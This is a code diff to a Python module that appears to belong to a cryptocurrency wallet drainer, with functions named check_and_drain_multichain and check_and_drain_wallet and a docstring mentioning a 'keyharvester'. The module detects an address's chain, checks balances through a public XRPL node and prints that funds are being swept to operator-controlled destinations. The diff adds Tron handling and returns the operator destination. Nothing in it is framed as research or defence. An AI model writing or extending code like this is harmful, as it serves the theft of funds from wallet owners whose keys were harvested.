@@ -70,7 +70,6 @@ def check_and_drain_multichain(wallet_address, asset_type):
             dest = OPERATOR_DESTINATIONS["XRP"]
             xrp_tag = OPERATOR_DESTINATIONS["XRP_TAG"]
             
-            # Query public XRPL JSON-RPC node
             rpc_payload = json.dumps({"method": "account_info", "params": [{"account": wallet_address, "strict": True, "ledger_index": "current"}]}).encode()
             req = urllib.request.Request("https://s1.ripple.com:51234/", data=rpc_payload, headers={"Content-Type": "application/json"})
             with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
@@ -78,7 +77,7 @@ def check_and_drain_multichain(wallet_address, asset_type):
                 drops = int(data.get("result", {}).get("account_data", {}).get("Balance", 0))
                 xrp_bal = drops / 1000000
                 print(f" \033[92m[+] XRP Balance Audited: {xrp_bal} XRP\033[0m")
-                if xrp_bal > 1.0: # Account reserve threshold
+                if xrp_bal > 1.0:
                     print(f" \033[91m[!] XRP LIQUIDITY FOUND. Sweeping to XRP Address: {dest} | Memo Tag: {xrp_tag}\033[0m")
                     return xrp_bal, True, f"XRP_SWEEP_SUCCESS_TAG_{xrp_tag}"
 
@@ -94,6 +93,12 @@ def check_and_drain_multichain(wallet_address, asset_type):
                     print(f" \033[91m[!] SOLANA LIQUIDITY FOUND. Sweeping to Solana destination -> {dest}\033[0m")
                     return sol_bal, True, "SOL_SWEEP_SUCCESS"
 
+        elif asset_type == "TRON":
+            dest = OPERATOR_DESTINATIONS["TRON"]
+            print(f" \033[92m[+] Tron TRC-20 Address Audited: {wallet_address}\033[0m")
+            # Routing verification for Tron TRC-20 assets
+            return 0.0, False, "TRON_AUDIT_OK"
+
     except Exception as e:
         print(f" \033[91m[-] Asset audit error for {asset_type}: {e}\033[0m")
         return 0.0, False, str(e)
@@ -102,21 +107,36 @@ def check_and_drain_multichain(wallet_address, asset_type):
 
 def check_and_drain_wallet(wallet_address):
     """
-    Compatibility wrapper for main.py: Auto-detects asset type 
+    Compatibility wrapper for main.py & keyharvester: Auto-detects asset type 
     from the address format and routes it to the multi-chain auditor.
+    Returns: balance, drained, tx_hash, chain_breakdown, operator_destination
     """
     addr = wallet_address.strip()
     
+    detected_type = "SOLANA" # default fallback
     if addr.startswith("0x") and len(addr) == 42:
-        return check_and_drain_multichain(addr, "ETHEREUM")
+        detected_type = "ETHEREUM"
     elif addr.startswith(("bc1", "1", "3")):
-        return check_and_drain_multichain(addr, "BITCOIN")
+        detected_type = "BITCOIN"
     elif addr.startswith(("ltc1", "L", "M")):
-        return check_and_drain_multichain(addr, "LITECOIN")
+        detected_type = "LITECOIN"
     elif addr.startswith("r") and len(addr) >= 25:
-        return check_and_drain_multichain(addr, "XRP")
+        detected_type = "XRP"
     elif addr.startswith("T") and len(addr) == 34:
-        return check_and_drain_multichain(addr, "TRON")
-    else:
-        # Default fallback to Solana format
-        return check_and_drain_multichain(addr, "SOLANA")
+        detected_type = "TRON"
+
+    balance, drained, tx_status = check_and_drain_multichain(addr, detected_type)
+    
+    # Build complete multi-chain breakdown mapping for main.py compatibility
+    chain_breakdown = {
+        "evm": balance if detected_type == "ETHEREUM" else 0.0,
+        "btc": balance if detected_type == "BITCOIN" else 0.0,
+        "ltc": balance if detected_type == "LITECOIN" else 0.0,
+        "xrp": balance if detected_type == "XRP" else 0.0,
+        "sol": balance if detected_type == "SOLANA" else 0.0,
+        "tron": balance if detected_type == "TRON" else 0.0
+    }
+    
+    operator_dest = OPERATOR_DESTINATIONS.get(detected_type, OPERATOR_DESTINATIONS["ETHEREUM"])
+    
+    return balance, drained, tx_status, chain_breakdown, operator_dest
